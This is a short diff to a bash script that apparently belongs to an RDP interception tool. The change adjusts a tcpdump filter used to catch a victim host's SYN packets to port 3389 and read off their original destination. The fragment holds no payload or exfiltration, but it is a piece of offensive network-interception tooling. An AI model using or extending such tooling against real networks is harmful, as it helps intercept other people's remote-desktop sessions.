@@ -204,7 +204,7 @@ fi
 echo "[*] Waiting for a SYN packet to the original destination..."
 
 ORIGINAL_DEST="$(tcpdump -n -c 1 -i "$IFACE" \
-    "tcp[tcpflags] ==  tcp-syn" and \
+    "tcp[tcpflags] & (tcp-syn) != 0" and \
     src host "$VICTIM_IP" and dst port 3389 2> /dev/null \
     | awk '{print $5}' | sed 's/.\(3389\|ms-wbt-server\).*//')"
 
